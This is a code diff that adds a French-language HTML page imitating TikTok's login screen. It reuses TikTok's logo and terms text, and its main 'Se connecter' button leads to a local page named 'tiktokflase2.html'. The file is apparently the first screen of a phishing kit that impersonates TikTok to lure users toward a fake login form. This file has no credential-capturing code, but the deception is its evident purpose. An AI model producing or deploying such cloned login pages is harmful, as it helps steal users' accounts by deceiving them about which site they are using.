@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion TikTok</title>
+    <style>
+        /* Reset some default browser styles */
+        body, h1, p, button, input {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+		body {
+            justify-content: center;
+            height: 100vh;
+            background-color: #f8f8f8;
+        }
+		
+        .body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f8f8;
+        }
+
+        .container {
+            width: 400px;
+            max-width: 100%;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 140px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px ;
+            margin-bottom: 12px;
+            border-width : 1px;
+            border-radius: 6px;
+			border-color : #f0f0f2 ;
+            font-size: 16px;
+            font-weight: bold;
+			background-color : #f8f8f8 ;
+        }
+		
+		.btn:hover{
+            background-color: #f0f0f2;
+		}
+
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            color: #aaa;
+            position: relative;
+        }
+
+        .divider:before,
+        .divider:after {
+            content: '';
+            display: block;
+            width: 100%;
+            height: 1px;
+            background-color: #e0e0e0;
+            position: absolute;
+            top: 50%;
+        }
+
+        .divider:before {
+            left: 0;
+        }
+
+        .divider:after {
+            right: 0;
+        }
+
+        .divider span {
+            background-color: #fff;
+            padding: 0 10px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .footer {
+            text-align: center;
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #aaa;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+		
+		.clc {
+			background-color: #f8f8f8;
+			width: 115px;
+			padding:10px;
+		}
+    </style>
+	 <script>
+        function redirectTo(url) {
+            window.location.href = url;
+        }
+    </script>
+</head>
+<body>
+    <img class="clc" src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1024px-TikTok_logo.svg.png" alt="TikTok">
+    <div class="body">
+		<div class="container">
+			<div class="logo">
+				<img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1024px-TikTok_logo.svg.png" alt="TikTok">
+			</div>
+			<div class="title">Connexion</div>
+            <button class="btn" onclick="redirectTo('tiktokflase2.html')">Se connecter</button>
+			<button class="btn" onclick="redirectTo('https://www.facebook.com')" >Continuer avec Facebook</button>
+			<button class="btn" onclick="redirectTo('https://www.google.com')">Continuer avec Google</button>
+			<button class="btn" onclick="redirectTo('https://www.twitter.com')">Continuer avec Twitter</button>
+			<div class="divider">
+				<span>ou</span>
+			</div>
+			<div class="footer">
+				<p>En continuant, vous acceptez les <a href="#">Conditions d'utilisation</a> et la <a href="#">Politique de confidentialité</a> de TikTok.</p>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
